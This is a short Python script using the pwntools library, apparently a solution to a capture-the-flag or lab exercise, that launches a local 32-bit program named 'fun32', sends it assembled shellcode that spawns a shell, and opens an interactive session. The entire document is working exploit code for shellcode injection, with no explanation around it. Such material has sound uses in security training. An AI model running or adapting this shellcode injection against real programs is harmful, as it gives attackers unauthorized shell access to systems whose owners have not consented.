from pwn import *
context.arch = "i386"
p = process("./fun32")

payload = asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
